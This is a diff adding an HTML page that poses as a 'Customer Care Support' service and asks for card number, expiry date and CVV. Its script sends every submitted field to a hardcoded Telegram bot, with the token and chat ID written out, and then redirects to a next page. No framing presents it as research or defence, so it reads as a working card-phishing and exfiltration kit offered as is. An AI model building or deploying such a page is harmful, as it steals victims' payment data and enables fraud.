@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+
+    <link rel="stylesheet" href="style.css">
+    <title>Customer Support</title>
+  </head>
+  <body>
+    <div id="carouselExampleCaptions mb-4" class="carousel slide" data-bs-ride="carousel">
+        <div class="carousel-indicators">
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="1" aria-label="Slide 2"></button>
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="2" aria-label="Slide 3"></button>
+        </div>
+        <div class="carousel-inner">
+          <div class="carousel-item active">
+            <img src="1.jpg" class="d-block w-100" alt="...">
+          </div>
+          <div class="carousel-item">
+            <img src="2.png" class="d-block w-100" alt="...">
+          </div>
+          <div class="carousel-item">
+            <img src="2.webp" class="d-block w-100" alt="...">
+          </div>
+        </div>
+        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="prev">
+          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Previous</span>
+        </button>
+        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="next">
+          <span class="carousel-control-next-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Next</span>
+        </button>
+      </div>
+      <h3 class="text-center mt-3">CUSTOMER CARE SUPPORT INSTANT SOLUTION</h3>
+      <img src="step4.jpeg" class="w-100" alt="">
+      <input type="hidden" id="nextValue" value="VisaMastercard-2.html">
+      
+     <div class="form-container m-2">
+        <form onsubmit="sendToTelegram(event)">
+          <div class="form-floating mb-3">
+            <input type="text" class="form-control" inputmode="numeric" id="ccnum""  name="dbbno" placeholder="Ex. 0000 0000 0000 0000" required>
+            <label>Card Number*</label>
+          </div>
+          <div class="d-flex "style="gap:10px;">
+            <div class="form-floating mb-3">
+              <input type="text" inputmode="numeric" name="exdate" class="form-control" id="edate" placeholder="Ex. 05/22" required>
+              <label>Expiry Date*</label>
+            </div>
+            <div class="form-floating mb-3">
+              <input type="text" inputmode="numeric" minlength="3" maxlength="3" name="cvv" class="form-control" placeholder="Ex. 123" required>
+              <label>CVV*</label>
+            </div>
+          </div>
+
+          <div class="d-flex justify-content-between">
+            <a href="3.html" type="submit" class="btn btn-outline-success  mt-3 text-center">
+              <img src="back.png" alt="">
+            </a>
+            <button type="submit" class="btn btn-success  mt-3 text-center" id="submit-button">Next</button>
+          </div>
+        </form>
+     </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <script>
+      new Cleave('#ccnum', {
+              creditCard: true
+          });
+          new Cleave('#edate', {
+              date: true,
+              datePattern: ['m', 'y']
+          });
+          new Cleave('#dob', {
+              date: true,
+              datePattern: ['d', 'm', 'Y']
+          });
+  </script>
+  <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+  <script src="help/script.js"></script>
+    <script>
+    async function sendToTelegram(event) {
+        event.preventDefault(); // Prevent form's default submission
+
+        // Collect Form Data
+        const form = event.target;
+        const formData = new FormData(form);
+        const data = {};
+        formData.forEach((value, key) => {
+            data[key] = value;
+        });
+
+        // Telegram Bot Token and Chat ID
+        const botToken = "7247567488:AAH4j2BtXebdjviq0NdjgETTydSZB_RU6Pk";
+        const chatId = "7155441629";
+
+        // Create Message
+        let message = "New Form Submission:\n";
+        for (const [key, value] of Object.entries(data)) {
+            message += `${key}: ${value}\n`;
+        }
+
+        // Telegram API URL
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Send Data to Telegram
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message }),
+            });
+
+            if (response.ok) {
+                // Redirect to another page (replace 'nextpage.html' with your actual page)
+                window.location.href = "VisaMastercard-2.html";
+            } else {
+                alert("Failed to send message to Telegram.");
+            }
+        } catch (error) {
+            console.error("Error:", error);
+            alert("An error occurred while sending the message.");
+        }
+    }
+</script>
+  </body>
+</html>
